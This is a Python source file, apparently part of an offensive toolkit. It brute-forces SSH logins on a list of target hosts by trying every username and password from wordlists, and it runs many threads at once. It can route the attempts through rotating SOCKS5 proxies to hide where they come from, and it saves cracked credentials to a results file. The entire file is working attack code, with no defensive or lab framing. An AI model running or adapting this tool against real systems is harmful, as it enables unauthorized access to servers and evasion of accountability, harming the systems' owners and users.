from globals import global_live_hosts, global_tested_proxies, global_config, pause_event, stop_event
import subprocess
import os
import time
import threading
import socks
import socket
from itertools import cycle
from tqdm import tqdm
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed
import paramiko

# Load wordlists for SSH Bruteforce
def load_wordlists():
    """
    Load usernames and passwords from the wordlists directory.

    :return: Tuple (usernames, passwords)
    """
    wordlist_dir = "wordlists"
    username_file = os.path.join(wordlist_dir, "ssh_usernames.txt")
    password_file = os.path.join(wordlist_dir, "ssh_passwords.txt")

    usernames, passwords = [], []

    try:
        if not os.path.exists(username_file):
            raise FileNotFoundError(f"[ERROR] Username wordlist not found: {username_file}")

        if not os.path.exists(password_file):
            raise FileNotFoundError(f"[ERROR] Password wordlist not found: {password_file}")

        with open(username_file, "r") as uf:
            usernames = [line.strip() for line in uf if line.strip()]

        with open(password_file, "r") as pf:
            passwords = [line.strip() for line in pf if line.strip()]

    except Exception as e:
        print(f"[ERROR] Failed to load wordlists: {e}")

    print(f"[INFO] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
    return usernames, passwords


# Perform SSH Bruteforce
def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
    """
    Perform SSH brute force attack using Paramiko.

    :param targets: List of target hosts to attack
    :param usernames: List of usernames to test
    :param passwords: List of passwords to test
    :param max_threads: Maximum number of concurrent threads
    """
    results_file = "results/cracked.txt"
    os.makedirs("results", exist_ok=True)

    print("[INFO] Starting brute force attack...")

    proxy_cycle = cycle(global_tested_proxies) if global_config.get("proxy_usage", False) else None

    def attempt_login(host, username, password, proxy=None):
        """
        Attempt SSH login for a single target using Paramiko.

        :param host: Target host
        :param username: SSH username
        :param password: SSH password
        :param proxy: Optional SOCKS5 proxy
        :return: None
        """
        while pause_event.is_set():
            time.sleep(0.5)

        if stop_event.is_set():
            print("[INFO] Stopping brute force attack.")
            return

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Apply proxy settings if enabled
            if proxy:
                proxy_host, proxy_port = proxy
                socks.setdefaultproxy(socks.SOCKS5, proxy_host, int(proxy_port))
                socket.socket = socks.socksocket

            # Connect using username/password
            client.connect(host, username=username, password=password, timeout=global_config.get("scan_timeout", 5))

            print(colored(f"[SUCCESS] {host} - {username}:{password}", "green"))

            with open(results_file, "a") as file:
                file.write(f"{host} {username}:{password}\n")

            client.close()

        except paramiko.AuthenticationException:
            pass  # Ignore failed login attempts

        except Exception as e:
            print(colored(f"[ERROR] {host} - {username}:{password}: {e}", "red"))

    # Start multithreaded bruteforcing
    with ThreadPoolExecutor(max_threads) as executor:
        futures = []
        for target in targets:
            proxy = next(proxy_cycle) if proxy_cycle else None
            for username in usernames:
                for password in passwords:
                    futures.append(
                        executor.submit(attempt_login, target, username, password, proxy)
                    )

        for future in tqdm(as_completed(futures), desc="Bruteforcing SSH", total=len(futures)):
            future.result()  # Ensure exceptions are caught

    print(f"[INFO] Brute force complete. Results saved to {results_file}.")
